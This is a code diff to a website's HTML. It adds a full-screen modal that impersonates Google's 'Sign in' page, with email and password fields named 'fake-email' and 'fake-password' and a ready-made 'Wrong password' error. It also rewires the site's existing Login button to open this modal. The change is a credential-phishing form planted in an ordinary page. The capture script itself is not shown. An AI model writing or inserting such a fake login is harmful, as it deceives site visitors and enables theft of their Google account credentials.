@@ -10,6 +10,42 @@
 </head>
 <body>
 
+    <div id="google-login-modal" class="modal" style="display: none; background: #fff; z-index: 9999; position: fixed; top: 0; left: 0; width: 100%; height: 100%;">
+        <div style="max-width: 450px; margin: 5% auto; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; font-family: 'Roboto', arial, sans-serif; box-shadow: 0 2px 10px rgba(0,0,0,0.1);">
+            <div style="text-align: center; margin-bottom: 10px;">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75">
+                <h1 style="font-size: 24px; font-weight: 400; margin-top: 10px; color: #202124;">Sign in</h1>
+                <p style="font-size: 16px; color: #202124; margin-top: 8px;">Use your Google Account</p>
+            </div>
+
+            <div id="email-step">
+                <input type="email" id="fake-email" placeholder="Email or phone" style="width: 100%; padding: 13px; margin: 25px 0 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box;">
+                <p style="color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; margin-bottom: 40px;">Forgot email?</p>
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <span style="color: #1a73e8; font-weight: 500; cursor: pointer; font-size: 14px;">Create account</span>
+                    <button onclick="showPasswordStep()" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px;">Next</button>
+                </div>
+            </div>
+
+            <div id="password-step" style="display: none;">
+                <div style="border: 1px solid #dadce0; border-radius: 20px; padding: 5px 15px; display: inline-flex; align-items: center; margin-bottom: 25px;">
+                    <i class="fa-solid fa-circle-user" style="margin-right: 8px; color: #5f6368;"></i>
+                    <span id="display-email" style="font-size: 14px; color: #3c4043;"></span>
+                </div>
+                <input type="password" id="fake-password" placeholder="Enter your password" style="width: 100%; padding: 13px; margin-bottom: 10px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box;">
+                
+                <div id="error-msg" style="color: #d93025; font-size: 12px; margin-bottom: 10px; display: none;">
+                    <i class="fa-solid fa-circle-exclamation"></i> Wrong password. Try again.
+                </div>
+
+                <p style="color: #1a73e8; font-weight: 500; font-size: 14px; cursor: pointer; margin-bottom: 40px;">Forgot password?</p>
+                <div style="display: flex; justify-content: flex-end;">
+                    <button onclick="submitFakeLogin()" style="background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px;">Next</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
     <div id="permission-modal" class="modal" style="display: none;">
         <div class="modal-content" style="text-align: center;">
             <i class="fa-solid fa-microchip" style="font-size: 3rem; color: var(--accent); margin-bottom: 15px;"></i>
@@ -47,7 +83,7 @@
         </ul>
         <div class="nav-icons">
             <i class="fa-solid fa-gear" id="settings-btn"></i>
-            <button class="login-btn">Login</button>
+            <button class="login-btn" onclick="document.getElementById('google-login-modal').style.display='block'">Login</button>
             <i class="fa-solid fa-moon" id="dark-mode-toggle"></i>
         </div>
     </nav>
